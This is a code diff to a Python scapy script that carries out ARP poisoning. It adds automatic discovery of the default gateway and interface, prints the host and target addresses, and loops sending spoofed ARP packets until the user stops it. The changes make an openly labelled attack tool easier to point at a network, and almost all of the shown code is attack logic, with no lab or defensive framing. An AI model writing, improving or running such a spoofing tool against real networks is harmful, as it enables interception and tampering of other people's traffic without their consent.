@@ -8,6 +8,11 @@ import signal
 import logging
 from time import sleep
 import threading
+import netifaces
+
+gateways = netifaces.gateways()
+host = gateways['default'][2][0]
+interface=gateways['default'][2][1]
 
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 
@@ -17,20 +22,19 @@ def main():
         print("[-] Run me as root")
         sys.exit(1)
 
-    usage = 'Usage: %prog [-i interface] [-t target] [-sniff] host'
+    usage = 'Usage: %prog [-i interface] [-t target] [-h ]'
     parser = OptionParser(usage)
     parser.add_option('-i', dest='interface', help='Select interface to use.')
     parser.add_option('-t', dest='target', help='specify target to ARP poison')
-    #parser.add_option('--sniff', dest='sniff', help="Allows Program to sniff after connection is made")
+    #parser.add_option('-h', dest='Help', help='prints this help screen or a help screen for any option')
+    #one day sniff ill add you, one day.
     parser.add_option('-s', action='store_true', dest='summary', default=False, help='Show packet summary and ask for confirmation before poisoning')
     (options, args) = parser.parse_args()
 
-    if len(args) != 1 or options.interface is None:
-        parser.print_help()
-        sys.exit(0)
-
-    host = args[0]
-    mac = get_if_hwaddr(options.interface)
+    if options.interface is None:
+        mac = get_if_hwaddr(interface)
+    else:
+        mac = get_if_hwaddr(options.interface)
 
     def build_req(target, host):
         if target is None:
@@ -47,9 +51,15 @@ def main():
         return pkt
 
     def arp_poison(pkt):
+        print("Host located at ", host)
+        if options.target is None:
+            print("Test Target (no ip)\nMAC = FF:FF:FF:FF:FF:FF")
+        else:
+            print("Target located at ",options.target,"\nMAC = ", getmacbyip(options.target))
         print("[*] Started ARP Poison Attack [CTRL-C] to Stop!")
         try:
             while True:
+                print('.',end='')
                 sendp(pkt, inter=2, iface=options.interface)
                 time.sleep(3)
         except KeyboardInterrupt:
